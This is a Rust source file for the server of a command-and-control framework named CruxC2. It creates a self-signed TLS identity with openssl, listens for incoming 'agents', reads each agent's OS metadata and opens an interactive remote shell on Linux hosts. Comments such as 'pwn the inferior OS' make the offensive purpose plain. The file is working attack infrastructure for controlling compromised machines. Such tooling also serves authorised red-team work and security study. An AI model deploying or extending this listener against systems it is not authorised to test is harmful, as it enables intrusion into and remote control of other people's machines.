#[path = "../utils/mod.rs"]
mod utils;
mod args;
mod linux_shell;

// crates
use clap::error::Result;
use clap::{Parser};
use serde_json;
use colored::Colorize;
use native_tls::{Identity, TlsAcceptor, TlsStream};
use rpassword::read_password;

// std
use std::net::{TcpListener, TcpStream};
use std::fs::{File,create_dir_all};
use std::io::{Read, Write};
use std::path::Path;
use std::sync::Arc;
use std::process::Command;
use std::env;

// my stuff
use args::CruxServerArgs;
use linux_shell::linux_shell;
use utils::os::{OS, Metadata};
use utils::network::read_length_prefix;

static BANNER: &str = "
   ______                             ______   _____
 .' ___  |                          .' ___  | / ___ `.
/ .'   \\_| _ .--.  __   _   _   __ / .'   \\_||_/___) |
| |       [ `/'`\\][  | | | [ \\ [  ]| |        .'____.'
\\ `.___.'\\ | |     | \\_/ |, > '  < \\ `.___.'\\/ /_____
 `.____ .'[___]    '.__.'_/[__]`\\_] `.____ .'|_______|

";


fn handle_client(stream: &mut TlsStream<TcpStream>, agent_id: u16) -> Result<(), Box<dyn std::error::Error>>{
    // Get Peer IP address
    let peer_ip = stream.get_ref().peer_addr()?;

    println!("Agent {} Connected from {}!", agent_id, peer_ip);

    // Get metadata from client
    let metabuf = read_length_prefix(stream)?;
    let meta_str = String::from_utf8_lossy(&metabuf);
    let meta: Metadata = serde_json::from_str(&meta_str)?;

    println!("Current Shell Path: {}", meta.shell_path);

    // Launch shell
    match meta.os_type {
        OS::Linux => {
            let _ = linux_shell(stream, &meta_str);
        },
        OS::Windows => {
            println!("Windows Support is under construction. You will be able to pwn the inferior OS soon™:)");
        },
        _ => {
            eprintln!("Unknown OS type");
        }
    };
    stream.shutdown()?;
    println!("Agent {} exiting!", agent_id);
    return Ok(())
}

fn generate_p12(config_path: &str) -> Result<(), Box<dyn std::error::Error>>{
    let identity_path = format!("{}/identity.pfx", config_path);
    let key_path = format!("{}/CruxC2.key", config_path);
    let cert_path = format!("{}/CruxC2.crt", config_path);

    // Generate Key and Certificate
    let key_cert_args = vec!["req", "-newkey", "rsa:4096", "-nodes", "-keyout", &key_path, "-x509", "-days", "365", "-out", &cert_path, "-subj", "/CN=example.com"];
    match Command::new("openssl").args(&key_cert_args).spawn() {
        Ok(mut child) => {
            let _ = child.wait();
        },
        Err(e) => {
            eprintln!("Error creating key and certificate: {}", e);
            return Err(Box::new(e));
        }
    };

    // Ask user for password for the identity file and export it as environment variable
    print!("Please set password for identity file: ");
    std::io::stdout().flush().unwrap();
    let pkcs12_password = read_password()?;
    println!("Password Received, generating PKCS12 identity file.");
    unsafe {
        env::set_var("PKCS12_PASS", &pkcs12_password);
    }

    // Generate PKCS12 identity file
    let p12_args = vec!["pkcs12", "-export", "-inkey", &key_path, "-in", &cert_path, "-out", &identity_path, "-passout", "env:PKCS12_PASS"];
    match Command::new("openssl").args(&p12_args).spawn(){
        Ok(mut child) => {
            let _ = child.wait();
        },
        Err(e) => {
            eprintln!("Error creating PKCS12 identity file: {}", e);
            return Err(Box::new(e));
        }
    };
    println!("PKCS12 identity_file ({}) generation complete, happy hacking!", identity_path);
    return Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Check if config directory exists, create if not
    let home_dir = env::var("HOME").unwrap_or("/".to_string());
    let config_path_str = format!("{}/.config/CruxC2", home_dir);
    let config_path = Path::new(&config_path_str);
    if !config_path.exists(){
        println!("Default config directory ($HOME/.config/CruxC2) not detected, creating directory");
        create_dir_all(&config_path)?;
    }

    // Check if Identity file is present, generate if not.
    let identity_path_str = format!("{}/identity.pfx", config_path_str);
    let identity_path = Path::new(&identity_path_str);
    if !identity_path.is_file(){
        println!("Generating identity file at $HOME/.config/CruxC2/identity.pfx");
        generate_p12(&config_path_str)?;
    }

    let args = CruxServerArgs::parse();

    // Process Identity File
    let Ok(mut identity_file) = File::open(&args.identity) else {
        let err_str = format!("Cannot open identity file: {}", args.identity);
        return Err(err_str.into());
    };
    let mut identity = vec![];
    if let Err(_) = identity_file.read_to_end(&mut identity) {
        let err_str = format!("Error Reading identity file: {}", args.identity);
        return Err(err_str.into())
    }

    // Read pkcs12 password
    print!("Please enter password for identity file ({}): ", args.identity.yellow().bold());
    std::io::stdout().flush().unwrap();

    let pkcs12_password = read_password()?;
    let Ok(identity) = Identity::from_pkcs12(&identity, &pkcs12_password) else {
        return Err("Cannot read identity file with provided password. If you have forgotten the password, please delete your identity file and re-run CruxServer to generate a new identity file.".into())
    };

    // Set up TLS
    let acceptor = TlsAcceptor::new(identity).unwrap();
    let acceptor = Arc::new(acceptor);

    // Bind to listening port
    let addr = format!("0.0.0.0:{}", args.port);
    let listener = TcpListener::bind(&addr)?;

    println!("{}\nCruxServer is listening on port {}",BANNER.yellow().bold(), args.port.cyan().bold());

    let mut agent_id = 0;

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let acceptor = acceptor.clone();
                let mut strm = match acceptor.accept(stream) {
                    Ok(s) => s,
                    Err(e) => {
                        eprintln!("Error accepting stream: {}",e);
                        continue
                    }
                };
                if let Err(e) = handle_client(&mut strm, agent_id){
                    eprintln!("Agent handling error: {}", e);
                    let _ = strm.shutdown();
                }
                agent_id += 1;
            }
            Err(e) => eprintln!("Connection failed: {}", e),
        }
    }
    Ok(())
}
